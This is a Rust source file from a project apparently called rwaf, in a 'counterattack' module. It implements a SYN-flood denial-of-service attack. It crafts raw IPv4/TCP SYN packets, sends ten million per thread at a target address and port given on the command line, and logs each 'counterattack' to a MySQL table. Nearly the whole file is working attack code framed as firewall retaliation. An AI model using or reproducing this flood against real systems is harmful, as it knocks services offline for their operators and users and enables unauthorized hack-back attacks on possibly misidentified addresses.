//! @Author       : 白银
//! @Date         : 2023-01-19 19:33:57
//! @LastEditors  : 白银
//! @LastEditTime : 2023-02-17 19:35:57
//! @FilePath     : /rwaf/src/module/counterattack/syn_flood.rs
//! @Description  :
//! @Attention    :
//! @Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved.

use mysql::{params, prelude::Queryable, Pool};
use pnet::packet::{
    ip::*,
    ipv4::{checksum, Ipv4Flags, MutableIpv4Packet},
    tcp::{ipv4_checksum, MutableTcpPacket, TcpFlags, TcpOption, TcpPacket},
};
use pnet_transport::{transport_channel, TransportChannelType::Layer3};
use rand::{random, thread_rng, Rng};
use std::{env, fs::File, io::Read, net::Ipv4Addr, process::Command, thread};
const IPV4_HEADER_LEN: usize = 20;
const TCP_HEADER_LEN: usize = 32;
const DATA_HEADER_LEN: usize = 1024;

pub fn start_syn() {
    // let protcol = Layer3(IpNextHeaderProtocols::Ipv4);
    // let (mut tx, _) = match transport_channel(64, protcol) {
    //     Ok((tx, rx)) => (tx, rx),
    //     Err(e) => panic!("err {}", e),
    // };

    let data_count = 10000000;
    // println!("input ipv4_addr & port:");
    // println!("for example -> 127.0.0.1:1234");
    let args: Vec<String> = env::args().collect();
    let arg_ipv4_addr_port = &args.clone()[2];
    let ipv4_addr_port = arg_ipv4_addr_port.to_string();
    // stdin().read_line(&mut ipv4_addr_port).expect("err");
    let ipv4_addr: &str = get_ipv4_addr(&ipv4_addr_port);
    let ipv4_port: &str = get_ipv4_port(&ipv4_addr_port);

    let target: Ipv4Addr = ipv4_addr.trim().clone().parse().unwrap();
    let target_port: i32 = ipv4_port.trim().clone().parse().unwrap();

    // let addr = ipv4_addr.clone();

    // println!("{}", ipv4_addr);
    // println!("{}", ipv4_port);

    // println!("input thread_num:");
    let args: Vec<String> = env::args().collect();
    let arg_thread_num = &args.clone()[3];
    let thread_num = arg_thread_num.to_string();
    // stdin().read_line(&mut thread_num).expect("err");

    let sqlurl = &get_only_sqlurl().to_string()[..];

    let binding = get_date_time();
    let date_time: Vec<&str> = binding.split("\n").collect();
    let now_date = date_time.clone()[0]; //get system date
    let now_time = date_time.clone()[1]; //get system time
    let do_what = "counterattack";
    let counterattack_ip = &target.to_string();
    let event_id: String = now_date.to_string() + now_time + do_what + counterattack_ip;
    let input_event_id = super::super::use_sm3::sm3_main(event_id);

    write_to_respond_log_sql(
        sqlurl,
        input_event_id,
        now_date,
        now_time,
        do_what,
        counterattack_ip,
    )
    .unwrap();

    for _ in 0..thread_num.trim().parse().unwrap() {
        let t = thread::spawn(move || {
            attack(data_count, target, target_port)
            // attack(data_count, get_ipv4_addr(&ipv4_addr_port), get_ipv4_port(&ipv4_addr_port))
        });
        t.join().unwrap();
    }

    // for _ in 0..thread_num.trim().parse().unwrap() {
    //     let t = thread::spawn(move ||{
    //         attack(data_count, target, target_port)
    //         // attack(data_count, get_ipv4_addr(&ipv4_addr_port), get_ipv4_port(&ipv4_addr_port))
    //     }

    //     );
    //     t.join();
    // }

    // let target: Ipv4Addr = ipv4_addr.trim().clone().parse().unwrap();
    // for _ in 0..data_count {
    //     let mut packet = [0u8; IPV4_HEADER_LEN + TCP_HEADER_LEN + DATA_HEADER_LEN];
    //     let packet = build_packet(target.clone().to_owned().to_string(), ipv4_port.clone().to_owned().parse().unwrap(), &mut packet[..]);
    //     tx.send_to(packet, std::net::IpAddr::V4(target));
    // }
}

fn get_ipv4_addr(res_ipv4_addr: &String) -> &str {
    let bytes = res_ipv4_addr.trim().as_bytes();

    for (i, &item) in bytes.iter().enumerate() {
        if item == b':' {
            return &res_ipv4_addr[0..i];
        }
    }

    &res_ipv4_addr[..]
}

fn get_ipv4_port(res_ipv4_port: &String) -> &str {
    let len = res_ipv4_port.trim().chars().count();
    let bytes = res_ipv4_port.trim().as_bytes();

    for (i, &item) in bytes.iter().enumerate() {
        if item == b':' {
            return &res_ipv4_port[i + 1..len];
        }
    }

    &res_ipv4_port[..]
}

fn build_packet(target: String, port: u32, packet: &mut [u8]) -> TcpPacket {
    packet[IPV4_HEADER_LEN + TCP_HEADER_LEN] = 'h' as u8;
    packet[IPV4_HEADER_LEN + TCP_HEADER_LEN + 1] = 'e' as u8;
    packet[IPV4_HEADER_LEN + TCP_HEADER_LEN + 2] = 'l' as u8;
    packet[IPV4_HEADER_LEN + TCP_HEADER_LEN + 3] = 'l' as u8;
    packet[IPV4_HEADER_LEN + TCP_HEADER_LEN + 4] = 'o' as u8;

    // let abcd = get_local_ipv4();

    // let ipv4_source: Ipv4Addr = abcd.clone().;
    // println!("{}", get_local_ipv4());
    let ipv4_source: Ipv4Addr = get_local_ipv4().trim().parse().unwrap();

    let ipv4_dst: Ipv4Addr = target.parse().unwrap();
    {
        // let packet_len = packet.len();
        let mut ip_header = MutableIpv4Packet::new(&mut packet[..]).unwrap();

        ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip_header.set_source(ipv4_source);
        ip_header.set_flags(Ipv4Flags::DontFragment);
        ip_header.set_destination(ipv4_dst);
        ip_header.set_ttl(128);
        ip_header.set_version(4);
        ip_header.set_header_length(6);
        let checksum = checksum(&ip_header.to_immutable());
        ip_header.set_checksum(checksum);
    }

    let mut rng = thread_rng();
    let mut tcp_header = MutableTcpPacket::new(&mut packet[IPV4_HEADER_LEN..]).unwrap();

    tcp_header.set_source(rng.gen_range(1000..5000));
    tcp_header.set_destination(port as u16);
    tcp_header.set_sequence(random::<u32>());
    tcp_header.set_flags(TcpFlags::SYN);
    tcp_header.set_window(rng.gen_range(1000..5000));
    tcp_header.set_data_offset(8);
    tcp_header.set_urgent_ptr(0);
    tcp_header.set_options(&[
        TcpOption::mss(1460),
        TcpOption::sack_perm(),
        TcpOption::nop(),
        TcpOption::nop(),
        TcpOption::wscale(7),
    ]);
    let checksum = ipv4_checksum(&tcp_header.to_immutable(), &ipv4_source, &ipv4_dst);
    tcp_header.set_checksum(checksum);

    TcpPacket::new(&mut packet[..]).unwrap()
}

fn get_local_ipv4() -> String {
    let output = Command::new("hostname").arg("-I").output().unwrap();
    let res = String::from_utf8(output.stdout).unwrap();

    res.trim().to_string()
}

fn attack(data_count: i32, target: Ipv4Addr, ipv4_port: i32) {
    // 选择 3 层 IPv4 协议, 构建发送器
    let protcol = Layer3(IpNextHeaderProtocols::Ipv4);

    let (mut tx, _) = match transport_channel(64, protcol) {
        Ok((tx, rx)) => (tx, rx),
        Err(e) => panic!("err {}", e),
    };
    for _ in 0..data_count {
        // 构建数据包
        let mut packet = [0u8; IPV4_HEADER_LEN + TCP_HEADER_LEN + DATA_HEADER_LEN];
        let packet = build_packet(
            target.clone().to_owned().to_string(),
            ipv4_port.clone().to_owned().try_into().unwrap(),
            &mut packet[..],
        );
        // 发送数据包到目标地址
        tx.send_to(packet, std::net::IpAddr::V4(target)).unwrap();
    }
}

fn get_date_time() -> String {
    // let mut command = execute::shell("echo $(date +%F%n%T)");
    let output = Command::new("date").arg("+%F%n%T").output().unwrap();
    let res = String::from_utf8(output.stdout).unwrap();

    res
}

fn get_only_sqlurl() -> String {
    let mut open_config = File::open("src/config").unwrap();
    let mut config_content = String::new();
    open_config.read_to_string(&mut config_content).unwrap();

    let binding = config_content;
    let res1: Vec<&str> = binding.split("\n").collect(); //get line
    let binding2 = res1.clone()[12]; //get line
    let binding3 = binding2.to_string();
    let res2: Vec<&str> = binding3.split("→").collect(); //get left
    let binding4 = res2.clone()[0]; //get left
    let binding5 = binding4.to_string();
    let real_res_tmp = get_needed_thing(&binding5); //get sqlurl

    real_res_tmp.to_string()
}

fn get_needed_thing(s: &String) -> &str {
    let len = s.trim().chars().count();
    let bytes = s.as_bytes();

    for (i, &item) in bytes.iter().enumerate() {
        if item == b'=' {
            return &s[i + 1..len];
        }
    }

    // s.len()
    &s[..]
}

struct Payment {
    event_id: String,
    date: String,
    time: String,
    event: String,
    counterattack_ip: String,
}

fn write_to_respond_log_sql(
    sqlurl: &str,
    input_event_id: String,
    now_date: &str,
    now_time: &str,
    do_what: &str,
    counterattack_ip: &String,
) -> std::result::Result<(), Box<dyn std::error::Error>> {
    let url = sqlurl;

    let pool = Pool::new(url)?;
    let mut conn = pool.get_conn()?;
    let payments = vec![Payment {
        event_id: input_event_id,
        date: now_date.to_string(),
        time: now_time.to_string(),
        event: do_what.to_string(),
        counterattack_ip: counterattack_ip.to_string(),
    }];

    conn.exec_batch(
        r"INSERT INTO respond_log (event_id, date, time, event, counterattack_ip) VALUES (:event_id, :date, :time, :event, :counterattack_ip)",
        payments.iter().map(|p| params! {
            "event_id" => p.event_id.clone(),
            "date" => p.date.clone(),
            "time" => &p.time,
            "event" => &p.event,
            "counterattack_ip" => &p.counterattack_ip,
        })
    )?;

    Ok(())
}
